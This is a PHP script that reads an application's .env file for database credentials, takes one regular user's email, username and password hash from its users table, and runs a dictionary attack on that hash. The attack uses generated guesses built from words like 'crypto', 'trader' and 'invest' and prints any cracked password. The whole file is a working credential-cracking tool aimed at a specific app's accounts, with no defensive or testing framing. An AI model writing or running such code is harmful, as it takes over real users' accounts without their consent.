<?php
$envPath = getcwd() . '/app/core_invapp/.env';
$env = [];
foreach (file($envPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
  if ($line === '' || $line[0] === '#') continue;
  $parts = explode('=', $line, 2);
  if (count($parts) !== 2) continue;
  $env[trim($parts[0])] = trim(trim($parts[1]), "\"'");
}
$mysqli = @new mysqli($env['DB_HOST'] ?? '127.0.0.1', $env['DB_USERNAME'] ?? '', $env['DB_PASSWORD'] ?? '', $env['DB_DATABASE'] ?? '', (int)($env['DB_PORT'] ?? 3306));
if ($mysqli->connect_errno) { echo 'DB_CONNECT_ERROR: ' . $mysqli->connect_error . PHP_EOL; exit(1);} 
$r = $mysqli->query("SELECT email,username,password FROM users WHERE role='user' LIMIT 1");
$row = $r ? $r->fetch_assoc() : null;
if (!$row) { echo "NO_USER_FOUND\n"; exit(1);} 
$targets = [];
$baseWords = ['demo','user','resultchecker','crypto','fortuna','trader','invest','welcome','test','default'];
$seps = ['','_','-','.'];
$suffixes = ['','1','12','123','1234','12345','123456','2023','2024','2025','2026','@123','!123'];
$prefixes = ['','@','#'];
foreach ($baseWords as $w1) {
  foreach ($baseWords as $w2) {
    if ($w1 === $w2) continue;
    foreach ($seps as $s) {
      foreach ($suffixes as $sf) {
        foreach ($prefixes as $pf) {
          $targets[] = $pf.$w1.$s.$w2.$sf;
        }
      }
    }
  }
}
$targets = array_merge($targets, [
  'demo_user','demo_user123','demo_user1234','demo-user123','demo.user123',
  'user@example.com','user@example.com123','resultchecker123','cryptofortune123'
]);
$targets = array_values(array_unique($targets));
$checked = 0; $found = null;
foreach ($targets as $g) {
  $checked++;
  if (password_verify($g, $row['password'])) { $found = $g; break; }
}
echo json_encode(['email'=>$row['email'],'username'=>$row['username'],'checked'=>$checked,'match'=>$found], JSON_UNESCAPED_SLASHES), PHP_EOL;
$mysqli->close();
?>
